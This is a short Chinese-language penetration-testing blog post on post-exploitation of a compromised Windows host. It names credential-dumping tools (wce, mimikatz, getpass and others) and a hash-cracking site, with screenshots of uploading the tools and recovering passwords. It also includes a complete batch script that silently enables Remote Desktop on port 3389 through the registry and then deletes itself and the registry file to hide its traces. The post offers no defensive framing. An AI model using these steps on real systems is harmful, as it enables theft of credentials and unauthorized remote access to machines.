+++
date = "2016-08-08T08:28:27+08:00"
description = ""
draft = false
tags = ["elevate privileges"]
title = "导出主机密码与开启3389"
topics = ["Pentest"]

+++

### 0x00 导出主机密码hash
* 条件
    * administrator以上权限

* 工具
    * wce
    * gethash
    * hashdump

* hash解密网站  
    * http://www.objectif-securite.ch/ophcrack.php

* 上传工具得到hash
![查看是否为管理员以上权限](/img/post/privilge_escalation_win_view_whoami.png)
![上传wce](/img/post/privilge_escalation_win_upload_wce.png)
![得到hash](/img/post/privilge_escalation_win_get_hash.png)
![解出密码](/img/post/privilge_escalation_win_get_pwd.png)

### 0x01 导出主机密码
* 条件
    * administrator以上权限
    * 当前管理员没有注销登陆(可以通过query user命令看出)

* 工具
    * mimikatz
    * getpass

* 上传工具得到密码
![查看是否为管理员以上权限](/img/post/privilge_escalation_win_view_whoami.png)
![查看管理员是否注销登陆](/img/post/privilge_escalation_win_query_user.png)
![上传getpass](/img/post/privilge_escalation_win_upload_getpass.png)
![得到密码1](/img/post/privilge_escalation_win_getpass1.png)
![得到密码2](/img/post/privilge_escalation_win_getpass2.png)

### 0x02 开启3389
* 直接使用注册表
![新建开3389的注册表](/img/post/privilge_escalation_win_new_file_3389_reg.png)
![开3389端口](/img/post/privilge_escalation_win_open_3389.png)
![成功开启3389端口](/img/post/privilge_escalation_win_open_3389_success.png)

* 写一个批处理也行
```
# 3389.bat内容如下：
echo Windows Registry Editor Version 5.00>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
echo "fDenyTSConnections"=dword:00000000>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
regedit /s 3389.reg 
del 3389.reg
del 3389.bat
```
![新建开3389的注册表](/img/post/privilge_escalation_win_new_file_3389_bat.png)
